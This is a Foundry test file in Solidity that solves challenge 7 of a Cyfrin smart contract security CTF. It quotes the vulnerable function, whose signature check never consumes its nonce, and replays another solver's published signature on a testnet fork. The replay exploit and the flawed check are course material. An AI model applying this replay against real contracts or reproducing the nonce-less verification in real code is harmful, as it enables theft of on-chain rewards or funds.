// SPDX-License-Identifier: MIT

pragma solidity =0.8.24;

import {console} from "forge-std/Test.sol";
import {Base} from "../Base.sol";

interface Challenge {
    function solveChallenge(
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 nonce,
        string memory twitterHandle
    ) external;
}

/*//////////////////////////////////////////////////////////////
                            CHALLENGE
//////////////////////////////////////////////////////////////*/
/*
/*
function solveChallenge(uint8 v, bytes32 r, bytes32 s, uint256 nonce, string memory twitterHandle) external {
        bytes32 structHash = keccak256(abi.encode(TYPEHASH));
        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = ECDSA.recover(hash, v, r, s);
        if (isUsedNonce(nonce)) {
            revert S7__NonceAlreadyUsed();
        }
        if (signer != s_signer) {
            revert S7__WrongSigner();
        }
        _updateAndRewardSolver(twitterHandle);
    }
*/


/// @title Solution for challenge 7  for Cyfrin CTF
/// @author focusoor
///
/// @notice This challenge is part of Cytfin Updraft 'Smart Contract Security' course
/// @notice Link to course section: https://github.com/Cyfrin/security-and-auditing-full-course-s23?tab=readme-ov-file#section-7-nft
contract CtfCyfrin7 is Base {

    Challenge challenge = Challenge(CHALLENGE_7);

    function setUp() public override {
        Base.setUp();
        vm.selectFork(sepoliaFork);
    }


    /// @notice Nonce is not used, so we can replay, e.g.
    /// v	           uint8	27
	/// r	           bytes32	0xa46fa4aa7a12d6d321525c965002f0a8e7d9fc5796cb693fc3f6afe07ccf2fb4
	/// s	           bytes32	0x2ea5f22aa0bc24d8131350706c6c4902fac21525bfb30500fae965385aea00dc
	/// nonce	       uint256	0
    /// twitterHandle  string	VitalikButerin
    function testSolveChallengeCtfCyfrin7() external {
        uint8 v = 27;
        bytes32 r = 0xa46fa4aa7a12d6d321525c965002f0a8e7d9fc5796cb693fc3f6afe07ccf2fb4;
        bytes32 s = 0x2ea5f22aa0bc24d8131350706c6c4902fac21525bfb30500fae965385aea00dc;
        uint256 nonce = 0;

        vm.expectEmit();
        emit ChallengeSolved(address(this), address(challenge), TWITTER_HANDLE);
        challenge.solveChallenge(v, r, s, nonce, TWITTER_HANDLE);
    }
}
